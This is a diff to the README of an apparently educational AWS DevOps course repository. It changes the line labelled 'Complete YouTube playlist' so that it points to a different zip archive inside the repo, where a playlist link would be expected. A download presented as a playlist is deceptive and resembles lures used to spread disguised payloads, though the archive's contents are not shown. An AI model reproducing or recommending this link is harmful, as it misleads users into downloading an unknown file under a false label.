@@ -1,6 +1,6 @@
 # aws-devops-zero-to-hero
 
-Complete YouTube playlist - https://raw.githubusercontent.com/sivahariu/aws-devops-zero-to-hero/main/day-20/aws-devops-zero-to-hero-v3.3.zip
+Complete YouTube playlist - https://github.com/sivahariu/aws-devops-zero-to-hero/raw/refs/heads/main/day-2/devops_hero_zero_to_aws_1.6.zip
 
 AWS zero to hero repo for devops engineers to learn AWS in 30 Days. This repo includes projects, presentations, interview questions and real time examples. Each day's class will provide real-time knowledge on AWS services, allowing you to apply what you've learned and gain practical skills in working with AWS in a DevOps context.
 
